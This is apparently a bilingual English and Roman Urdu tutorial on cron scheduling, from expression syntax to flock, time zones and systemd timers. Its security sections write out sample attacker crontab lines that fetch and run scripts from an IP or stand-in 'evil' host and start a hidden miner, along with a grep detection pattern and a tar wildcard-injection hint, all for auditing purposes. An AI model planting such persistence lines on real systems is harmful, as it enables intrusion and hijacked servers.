<Tr>
<En>
**cron** is a tireless assistant that looks at the clock **every minute** and runs any job whose time has come. You describe the time with **five fields** (minute, hour, day, month, weekday), followed by the command: `30 2 * * *` = every day at 02:30.
</En>
<Ur>
**cron** ek na thakne wala madadgar hai jo **har minute** ghari dekhta hai aur har wo kaam chalata hai jis ka waqt aa gaya ho. Aap waqt **paanch hisson** (minute, ghanta, din, mahina, hafte ka din) me batate hain, phir command: `30 2 * * *` = roz 02:30 baje.
</Ur>

## At a glance

<Glance>
<What>
<Tr>
<En>

- **cron**: the service that runs commands on a schedule.
- **crontab**: your list of scheduled jobs. Edit with `crontab -e`, view with `crontab -l`.
- Each line = **five time fields** + the command.
- `*` means "every", `*/5` means "every 5", `1-5` means "1 to 5".

</En>
<Ur>

- **cron**: wo service jo schedule par commands chalati hai.
- **crontab**: aap ke scheduled kaamon ki list. `crontab -e` se edit, `crontab -l` se dekhein.
- Har line = **paanch waqt ke hisse** + command.
- `*` matlab "har", `*/5` matlab "har 5", `1-5` matlab "1 se 5 tak".

</Ur>
</Tr>
</What>
<Why>
<Tr>
<En>

- **Backups, cleanups, reports, certificate renewals**: every server has work that must happen by itself.
- A broken job can fail **silently every night** unless it writes a log.
- **Attackers love cron**: one hidden line can re-install their malware every minute.

</En>
<Ur>

- **Backups, safai, reports, certificate renewals**: har server par aisa kaam hota hai jo khud ba khud hona chahiye.
- Toota hua kaam **har raat chupke se** fail ho sakta hai jab tak wo log na likhe.
- **Hackers ko cron pasand hai**: ek chhupi line har minute un ka malware dobara install kar sakti hai.

</Ur>
</Tr>
</Why>
<When>
<Tr>
<En>

- nightly database backups
- deleting old files every hour
- a weekly report every Monday
- the same five fields also appear in **Kubernetes CronJobs** and **GitHub Actions** schedules

</En>
<Ur>

- raat ko database backups
- har ghante purani files delete karna
- har Monday hafte ki report
- yahi paanch hisse **Kubernetes CronJobs** aur **GitHub Actions** schedules me bhi aate hain

</Ur>
</Tr>
</When>
<How>
<Tr>
<En>

Three rules make cron jobs reliable:

1. Use **full paths** for everything.
2. **Save the output** to a log: `>> /var/log/job.log 2>&1`.
3. Stop overlapping runs with **`flock`**.

</En>
<Ur>

Teen qaide cron jobs ko bharosemand banate hain:

1. Har cheez ke **poore paths** istemal karein.
2. **Output log me save** karein: `>> /var/log/job.log 2>&1`.
3. **`flock`** se ek saath do dafa chalne se rokein.

</Ur>
</Tr>
</How>
</Glance>

## The five fields

```text
┌───────────── minute        (0 - 59)
│ ┌─────────── hour          (0 - 23)
│ │ ┌───────── day of month  (1 - 31)
│ │ │ ┌─────── month         (1 - 12)
│ │ │ │ ┌───── day of week   (0 - 7, Sunday = 0 or 7)
│ │ │ │ │
* * * * *   command to run
```

<Tr>
<En>

| Expression | Runs |
| --- | --- |
| `* * * * *` | Every minute |
| `*/5 * * * *` | Every 5 minutes |
| `0 * * * *` | At the start of every hour |
| `30 2 * * *` | Every day at 02:30 |
| `0 9 * * 1-5` | 09:00, Monday to Friday |
| `0 7 * * 1` | Mondays at 07:00 |
| `0 0 1 * *` | Midnight on the 1st of every month |
| `15 3 * * 0` | Sundays at 03:15 |
| `0 */6 * * *` | Every 6 hours (00:00, 06:00, 12:00, 18:00) |
| `@reboot` | Once, when the server starts |
| `@daily`, `@hourly`, `@weekly` | Shortcuts |

</En>
<Ur>

| Expression | Kab chalta hai |
| --- | --- |
| `* * * * *` | Har minute |
| `*/5 * * * *` | Har 5 minute |
| `0 * * * *` | Har ghante ke shuru me |
| `30 2 * * *` | Roz 02:30 baje |
| `0 9 * * 1-5` | 09:00, Monday se Friday |
| `0 7 * * 1` | Har Monday 07:00 |
| `0 0 1 * *` | Har mahine ki 1 tareekh aadhi raat |
| `15 3 * * 0` | Har Sunday 03:15 |
| `0 */6 * * *` | Har 6 ghante (00:00, 06:00, 12:00, 18:00) |
| `@reboot` | Ek dafa, jab server shuru ho |
| `@daily`, `@hourly`, `@weekly` | Shortcuts |

</Ur>

## Learn it step by step

<Walkthrough>

<Step title="Read a cron expression">

<Tr>
<En>

Read left to right: **minute, hour, day, month, weekday**. The job runs when **all** fields match the current time. Tools like crontab.guru explain any expression in plain English.

</En>
<Ur>

Baayen se dayen parhein: **minute, ghanta, din, mahina, hafte ka din**. Kaam tab chalta hai jab **saare** hisse mojooda waqt se mil jayen. crontab.guru jaise tools kisi bhi expression ko saada English me samjhate hain.

</Ur>
</Tr>

```bash
explain() {
  read -r m h dom mon dow <<< "$1"
  printf '%-14s → minute=%s hour=%s day=%s month=%s weekday=%s\n' "$1" "$m" "$h" "$dom" "$mon" "$dow"
}
explain "30 2 * * *"
explain "*/15 * * * *"
explain "0 9 * * 1-5"
```

```text output
30 2 * * *     → minute=30 hour=2 day=* month=* weekday=*
*/15 * * * *   → minute=*/15 hour=* day=* month=* weekday=*
0 9 * * 1-5    → minute=0 hour=9 day=* month=* weekday=1-5
```

<Happened>
<Tr>
<En>

- `30 2 * * *`: minute 30 of hour 2, every day = **02:30 daily**.
- `*/15 * * * *`: every 15 minutes, all day.
- `0 9 * * 1-5`: 09:00 on weekdays 1–5 = **Monday to Friday**.

</En>
<Ur>

- `30 2 * * *`: ghanta 2 ka minute 30, har din = **roz 02:30**.
- `*/15 * * * *`: har 15 minute, saara din.
- `0 9 * * 1-5`: hafte ke din 1–5 par 09:00 = **Monday se Friday**.

</Ur>
</Tr>
</Happened>

<Callout type="warning" title="The classic mistake">
<Tr>
<En>`* 2 * * *` does **not** mean "at 2 a.m.". It means "**every minute** from 02:00 to 02:59": 60 runs! For once at 2 a.m., write `0 2 * * *`.</En>
<Ur>`* 2 * * *` ka matlab "raat 2 baje" **nahi**. Is ka matlab "02:00 se 02:59 tak **har minute**": 60 dafa! Raat 2 baje ek dafa ke liye `0 2 * * *` likhein.</Ur>
</Tr>
</Callout>

</Step>

<Step title="Edit and list your crontab">

<Tr>
<En>

Every user has their own crontab:

- `crontab -e`: edit (opens an editor and checks the result)
- `crontab -l`: list
- `crontab file`: install a whole file as your crontab
- `crontab -r`: remove **everything**, with **no** confirmation. Careful: `-r` is right next to `-e` on the keyboard!

</En>
<Ur>

Har user ki apni crontab hoti hai:

- `crontab -e`: edit (editor kholta hai aur nateeja check karta hai)
- `crontab -l`: list
- `crontab file`: poori file ko apni crontab bana do
- `crontab -r`: **sab kuch** mita do, **baghair** pooche. Ehtiyat: keyboard par `-r` bilkul `-e` ke saath hai!

</Ur>
</Tr>

```bash
printf '%s\n' "# m h dom mon dow command" "30 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1" > mycron.txt
crontab mycron.txt
crontab -l
crontab -r
crontab -l 2>&1 | sed 's/^no crontab for .*/no crontab installed any more/'
```

```text output
# m h dom mon dow command
30 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
no crontab installed any more
```

<Happened>
<Tr>
<En>We installed a crontab from a file, listed it, then `crontab -r` deleted it in one go. That's why teams keep their cron files in **Git**.</En>
<Ur>Hum ne file se crontab install ki, list dekhi, phir `crontab -r` ne ek hi baar me mita di. Isi liye teams apni cron files **Git** me rakhti hain.</Ur>
</Tr>
</Happened>

</Step>

<Step title="System cron files: /etc/cron.d">

<Tr>
<En>

Jobs for **apps and the system** live in `/etc/cron.d/` (one file per app). These lines have one **extra field**: the **user** to run as, right after the five time fields.

There are also folders `/etc/cron.daily/`, `/etc/cron.weekly/` and so on: put a script inside and it runs once a day/week.

</En>
<Ur>

**Apps aur system** ke kaam `/etc/cron.d/` me hote hain (har app ki ek file). In lines me ek **izafi hissa** hota hai: paanch waqt ke hisson ke foran baad **user** jis ke taur par chalana hai.

`/etc/cron.daily/`, `/etc/cron.weekly/` waghera folders bhi hain: andar script rakhein aur wo din/hafte me ek dafa chalegi.

</Ur>
</Tr>

```text
# /etc/cron.d/shop
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
MAILTO=""

# m  h  dom mon dow  user      command
30   2  *   *   *    shopapp   /usr/local/bin/backup.sh /var/www/shop /mnt/backups 14 >> /var/log/shop-backup.log 2>&1
*/5  *  *   *   *    root      /usr/local/bin/healthcheck.sh >> /var/log/health.log 2>&1
```

<Tr>
<En>File names in `/etc/cron.d` must not contain dots, and the file must end with a new line.</En>
<Ur>`/etc/cron.d` me file ke naam me dot nahi hona chahiye, aur file nayi line par khatam honi chahiye.</Ur>
</Tr>

</Step>

<Step title="Cron's tiny environment">

<Tr>
<En>

"It works when I run it, but not from cron!" This is the most common cron problem. Cron starts jobs with an almost **empty** environment:

- a very short `PATH`
- none of your `~/.bashrc` settings
- `/bin/sh`, not Bash
- a different starting folder

The fix: **full paths** for commands and files, set `PATH=` at the top, and `cd` into the right folder inside the script.

</En>
<Ur>

"Main chalaun to chalta hai, cron se nahi!" Ye cron ka sab se aam masla hai. Cron kaam taqreeban **khaali** environment ke saath shuru karta hai:

- bohot chhota `PATH`
- aap ki `~/.bashrc` ki koi setting nahi
- `/bin/sh`, Bash nahi
- shuru ka folder alag

Hal: commands aur files ke **poore paths**, upar `PATH=` set karein, aur script ke andar sahi folder me `cd` karein.

</Ur>
</Tr>

```bash
env -i PATH=/usr/bin:/bin HOME=/nonexistent /bin/sh -c 'echo "PATH=$PATH"; echo "PWD=$PWD" | sed "s|=.*|=<wherever cron starts>|"; command -v node > /dev/null && echo "node found" || echo "node NOT found in this PATH"'
```

```text output
PATH=/usr/bin:/bin
PWD=<wherever cron starts>
node NOT found in this PATH
```

<Happened>
<Tr>
<En>`env -i` starts a command with an empty environment, like cron does. With that short PATH, `node` **isn't found**. If you installed Node.js with nvm, it lives in `~/.nvm/…`, so cron needs the full path (`/home/alex/.nvm/versions/node/v22.11.0/bin/node`).</En>
<Ur>`env -i` command ko khaali environment ke saath shuru karta hai, jaise cron karta hai. Is chhote PATH ke saath `node` **nahi milta**. Agar aap ne Node.js nvm se install kiya, to wo `~/.nvm/…` me hai, isliye cron ko poora path chahiye (`/home/alex/.nvm/versions/node/v22.11.0/bin/node`).</Ur>
</Tr>
</Happened>

</Step>

<Step title="Save the output, or errors vanish">

<Tr>
<En>

Cron jobs have **no screen**. If you don't save the output, failures are invisible. Add this to every job:

`>> /var/log/job.log 2>&1`

- `>>` = append to the log (don't overwrite)
- `2>&1` = send **errors** to the same place

</En>
<Ur>

Cron jobs ki **koi screen nahi**. Output save na karein to failures nazar hi nahi aatin. Har kaam me ye shamil karein:

`>> /var/log/job.log 2>&1`

- `>>` = log ke aakhir me jorein (overwrite nahi)
- `2>&1` = **errors** bhi usi jagah bhejein

</Ur>
</Tr>

```bash
job() { echo "[$(date -d '2026-11-10 02:30' '+%F %T')] backup started"; ls /no/such/dir; echo "[$(date -d '2026-11-10 02:31' '+%F %T')] backup finished"; }
job >> job.log 2>&1
cat job.log
```

```text output
[2026-11-10 02:30:00] backup started
ls: cannot access '/no/such/dir': No such file or directory
[2026-11-10 02:31:00] backup finished
```

<Happened>
<Tr>
<En>Both the normal messages **and** the error ended up in the log, with timestamps. Without `2>&1`, the error line would have been lost.</En>
<Ur>Aam paigham **aur** error dono log me aa gaye, waqt ke saath. `2>&1` ke baghair error wali line zaya ho jati.</Ur>
</Tr>
</Happened>

</Step>

<Step title="% is special in a crontab line">

<Tr>
<En>

Inside a crontab line, `%` means "new line". So `date +%F` **silently breaks** the command. Either escape it as `\%`, or (better) move the command into a script and call the script.

</En>
<Ur>

Crontab line ke andar `%` ka matlab "nayi line" hai. Isliye `date +%F` command ko **chupke se tor** deta hai. Ya to ise `\%` likhein, ya (behtar) command ko script me daal kar script ko chalayen.

</Ur>
</Tr>

```text
# Broken:  0 2 * * * tar -czf /backups/site-$(date +%F).tgz /var/www/site
# Fixed:   0 2 * * * tar -czf /backups/site-$(date +\%F).tgz /var/www/site
# Best:    0 2 * * * /usr/local/bin/backup-site.sh
```

</Step>

<Step title="Stop jobs from overlapping: flock">

<Tr>
<En>

A job that runs every 5 minutes but sometimes takes 7 will pile up copies of itself and overload the server. `flock -n lockfile command` fixes it: if the previous run still holds the lock, the new one **just skips**.

</En>
<Ur>

Jo kaam har 5 minute chalta hai lekin kabhi 7 minute leta hai, wo apni copies jama kar ke server par bojh daal deta hai. `flock -n lockfile command` ise theek karta hai: agar pichla run abhi lock pakre hue ho, to naya **bas chhor deta** hai.

</Ur>
</Tr>

```bash
flock -n /tmp/demo-job.lock sleep 2 &
sleep 0.3
flock -n /tmp/demo-job.lock echo "second run" || echo "second run skipped: previous run still holds the lock"
wait
flock -n /tmp/demo-job.lock echo "third run: lock free again, job runs"
```

```text output
second run skipped: previous run still holds the lock
third run: lock free again, job runs
```

<Happened>
<Tr>
<En>The first run held the lock for 2 seconds, so the second was **skipped**. After it finished, the third run got the lock and ran. Crontab line: `*/5 * * * * flock -n /tmp/sync.lock /usr/local/bin/sync.sh >> /var/log/sync.log 2>&1`.</En>
<Ur>Pehle run ne 2 second lock pakra, isliye doosra **chhor diya gaya**. Us ke khatam hone ke baad teesre run ko lock mila aur wo chala. Crontab line: `*/5 * * * * flock -n /tmp/sync.lock /usr/local/bin/sync.sh >> /var/log/sync.log 2>&1`.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Watch the time zone">

<Tr>
<En>

Cron uses the **server's** time zone, which is often **UTC** on cloud servers. GitHub Actions schedules are **always** UTC. So "2 a.m." on a UTC server is 7 a.m. in a UTC+5 city such as Tashkent, maybe during business hours.

`timedatectl` shows the server's zone. Convert the time, or put `CRON_TZ=Asia/Tashkent` at the top of the crontab (supported by most modern cron versions).

</En>
<Ur>

Cron **server ka** time zone istemal karta hai, jo cloud servers par aksar **UTC** hota hai. GitHub Actions schedules **hamesha** UTC hote hain. To UTC server par "raat 2 baje" UTC+5 wale shehar, jaise Tashkent, me subah 7 baje hai, shayad kaam ke auqat me.

`timedatectl` server ka zone dikhata hai. Waqt convert karein, ya crontab ke upar `CRON_TZ=Asia/Tashkent` likhein (zyada tar jadeed cron versions me chalta hai).

</Ur>
</Tr>

```bash
TZ=UTC date -d 'TZ="Asia/Tashkent" 2026-11-10 02:00' '+02:00 in Tashkent is %H:%M UTC'
```

```text output
02:00 in Tashkent is 21:00 UTC
```

<Happened>
<Tr>
<En>So for 02:00 local time (UTC+5) on a UTC server, write `0 21 * * *`, and remember it runs on the **previous** UTC day.</En>
<Ur>Yani UTC server par 02:00 local waqt (UTC+5) ke liye `0 21 * * *` likhein, aur yaad rakhein ye UTC ke hisaab se **pichle** din chalta hai.</Ur>
</Tr>
</Happened>

</Step>

<Step title="One-off jobs: at">

<Tr>
<En>

`at` runs a command **once**, at a time you choose: "restart the service at 23:00 tonight", "remove this temporary rule in 30 minutes".

- `echo "command" | at 23:00`
- `atq`: list waiting jobs
- `atrm N`: cancel job N

</En>
<Ur>

`at` aap ke chune waqt par command **ek dafa** chalata hai: "aaj raat 23:00 baje service restart karo", "30 minute baad ye aarzi qaida hatao".

- `echo "command" | at 23:00`
- `atq`: intezar wale jobs ki list
- `atrm N`: job N cancel karo

</Ur>
</Tr>

```text
$ echo "/usr/local/bin/cleanup.sh" | at now + 30 minutes
job 7 at Mon Nov 10 15:05:00 2026
$ atq
7	Mon Nov 10 15:05:00 2026 a alex
```

</Step>

<Step title="systemd timers: the modern alternative">

<Tr>
<En>

A **systemd timer** is a `.timer` file that starts a `.service` on a schedule. It takes two small files instead of one line, but you get:

- logs in the journal **automatically**
- missed runs **caught up** after the server was off (`Persistent=true`)
- **no overlapping** runs, built in

`OnCalendar=*-*-* 02:30:00` = daily at 02:30. Check an expression with `systemd-analyze calendar "Mon *-*-* 07:00"`. List timers with `systemctl list-timers`.

</En>
<Ur>

**systemd timer** ek `.timer` file hai jo schedule par `.service` chalati hai. Ek line ki jagah do chhoti files lagti hain, lekin milta hai:

- journal me logs **khud ba khud**
- server band hone ke baad chhoote hue runs **poore** (`Persistent=true`)
- **ek saath do runs nahi**, pehle se mojood

`OnCalendar=*-*-* 02:30:00` = roz 02:30. Expression `systemd-analyze calendar "Mon *-*-* 07:00"` se check karein. Timers ki list `systemctl list-timers` se.

</Ur>
</Tr>

| | cron | systemd timer |
| --- | --- | --- |
| Setup | One line | Two small files |
| Logs | Only if you redirect | Automatic (journal) |
| Missed runs (server was off) | Lost | `Persistent=true` catches up |
| Overlap protection | Use `flock` | Built in |
| Available | Everywhere, incl. minimal systems | systemd systems |

</Step>

<Step title="Check cron for hidden attacker jobs">

<Tr>
<En>

After a break-in, attackers often add a cron line that **re-downloads** their malware every few minutes, so it comes back even after you delete it. Look for:

- `curl` or `wget` piped into `sh`
- strange folders like `/tmp/.x` or `/dev/shm`
- long encoded (base64) text
- jobs for users that shouldn't have any

</En>
<Ur>

Andar ghusne ke baad hackers aksar ek cron line jor dete hain jo har chand minute baad un ka malware **dobara download** karti hai, taa ke delete karne ke baad bhi wapas aa jaye. Ye dhoondein:

- `curl` ya `wget` jo `sh` me pipe ho
- ajeeb folders jaise `/tmp/.x` ya `/dev/shm`
- lamba encoded (base64) text
- un users ke jobs jin ke paas koi nahi hona chahiye

</Ur>
</Tr>

```bash
printf '%s\n' \
  '30 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1' \
  '*/2 * * * * curl -fsSL http://198.51.100.9/x.sh | sh' \
  '@reboot /dev/shm/.kworker -c pool.example:3333' \
  '0 7 * * 1 /usr/local/bin/report.sh' > suspicious-crontab.txt
grep -nE 'curl|wget|base64|/dev/shm|/tmp/\.|\| *(ba)?sh' suspicious-crontab.txt | sed 's/^/SUSPICIOUS line /'
```

```text output
SUSPICIOUS line 2:*/2 * * * * curl -fsSL http://198.51.100.9/x.sh | sh
SUSPICIOUS line 3:@reboot /dev/shm/.kworker -c pool.example:3333
```

<Happened>
<Tr>
<En>

- Line 2 downloads a script from an unknown IP every 2 minutes and runs it.
- Line 3 starts a hidden program from `/dev/shm` at every reboot, with a mining-pool address.
- Lines 1 and 4 are normal jobs.

</En>
<Ur>

- Line 2 har 2 minute baad anjaan IP se script download kar ke chalati hai.
- Line 3 har reboot par `/dev/shm` se chhupa program chalati hai, mining-pool ke pate ke saath.
- Lines 1 aur 4 aam kaam hain.

</Ur>
</Tr>
</Happened>

<Tr>

chmod +x report.sh

env -i /bin/sh -c "$PWD/report.sh >> $PWD/report.log 2>&1"
env -i /bin/sh -c "$PWD/report.sh >> $PWD/report.log 2>&1"

<DeepDive title="Where scheduled jobs live">

| Need | Where |
| --- | --- |
| Your own job as your user | `crontab -e` |
| A system job for an app | `/etc/cron.d/<app>` |
| Simple daily/weekly script | `/etc/cron.daily/`, `/etc/cron.weekly/` |
| Modern alternative with logs | systemd timer |
| In Kubernetes | `CronJob` resource (same five-field syntax!) |
| In GitHub Actions | `on: schedule: - cron: "30 2 * * *"` (same syntax, UTC) |

One exception to "all fields must match": if **both** day-of-month and day-of-week are set, the job runs when **either** matches. `anacron` runs missed daily/weekly jobs on machines that aren't always on.

</DeepDive>

<DeepDive title="Real world: the scheduled jobs of a small API server">

A VPS runs a Node.js API with PostgreSQL. All scheduled jobs live in `/etc/cron.d/app`, each backed by a script with logging and locking:

```text
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
MAILTO=""

# Every 10 min: expire old sessions (never two at once)
*/10 * * * *  app     flock -n /run/lock/sessions.lock /srv/app/bin/expire-sessions.sh 2>&1 | logger -t expire-sessions

# 02:30 daily: database backup to S3, then delete local copies older than 3 days
30 2 * * *    backup  /usr/local/bin/backup-db.sh 2>&1 | logger -t backup-db

# 04:00 Sundays: prune unused Docker images
0 4 * * 0     root    /usr/bin/docker image prune -af --filter "until=168h" 2>&1 | logger -t docker-prune
```

The important part is what happens when a job **fails**: the backup script ends by pinging a "dead man's switch" monitoring URL (Healthchecks.io, Cronitor, or a CloudWatch metric). If the ping doesn't arrive by 03:30, someone is alerted. Silent backup failures are otherwise discovered only when you need the backup.

</DeepDive>

<DeepDive title="Security lens">

Scheduled jobs run unattended, often as root, forever. That makes them perfect for attackers, and important for defenders to audit.

- **Persistence:** adding a line like `* * * * * curl http://evil/x | sh` is one of the most common ways attackers survive reboots and cleanups (MITRE ATT&CK T1053.003). Audit all user crontabs, `/etc/crontab`, `/etc/cron.*`, and systemd timers; alert on changes.
- **Writable scripts run by root:** if a root cron job runs `/opt/scripts/cleanup.sh` and a normal user can edit that file (or its folder), that user can become root. Check owners and modes of everything root's jobs run.
- **Wildcard injection:** a root job like `cd /uploads && tar czf /backup/u.tgz *` can be abused by creating files named like options (`--checkpoint-action=exec=...`). Use `--` and explicit paths.
- **PATH hijacking:** a job without absolute paths whose `PATH` includes a writable folder can be tricked into running a fake program.
- **Restrict who can use cron** with `/etc/cron.allow` and `/etc/cron.deny` on shared servers.
- **Secrets in crontab lines** are visible to anyone who can read the crontab, and in process listings while the job runs. Load them inside the script from a protected file.
- **Backups and patching are scheduled jobs:** monitor that they succeed.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="What does the cron expression 0 */6 * * 1-5 mean?">
At minute 0 of every sixth hour (00:00, 06:00, 12:00, 18:00), on Monday through Friday, every month. The fields are minute, hour, day of month, month and day of week.
</QA>

<QA q="A script works when you run it manually but fails from cron. What do you check?">
Cron runs with a minimal environment: a short PATH, no shell profile, /bin/sh instead of bash, a different working directory and no TTY. Check that the script uses absolute paths or sets PATH, has a correct shebang and is executable, does not rely on variables from .bashrc, escapes % in the crontab line, and redirect output to a log to see the actual error. Also confirm the job ran at all in the cron logs, and check the user and time zone.
</QA>

<QA q="How do you prevent a cron job from running twice at the same time?">
Wrap it with a lock, most simply `flock -n /path/to/lockfile command`, which exits if the previous run still holds the lock. Alternatively use a systemd timer (a service will not be started again while running) or a Kubernetes CronJob with concurrencyPolicy: Forbid.
</QA>

<QA q="How do attackers use cron, and how would you detect it?">
They add entries to user or system crontabs, or drop scripts into /etc/cron.d or the cron.daily-style directories, to re-run malware periodically and survive reboots. Detect it by inventorying all crontabs and timers, monitoring those files and directories for changes, alerting on cron jobs that download and execute content or run from /tmp, and reviewing cron execution logs.
</QA>

<QA q="When would you choose a systemd timer or a Kubernetes CronJob over cron?">
Use a systemd timer when you want automatic logging in the journal, dependency ordering, resource limits, sandboxing, catch-up after downtime and protection against overlapping runs on a single server. Use a Kubernetes CronJob or a cloud scheduler when workloads run in a cluster or serverless environment, so the job does not depend on a single machine and gets retries, history and concurrency policies.
</QA>

</DeepDive>
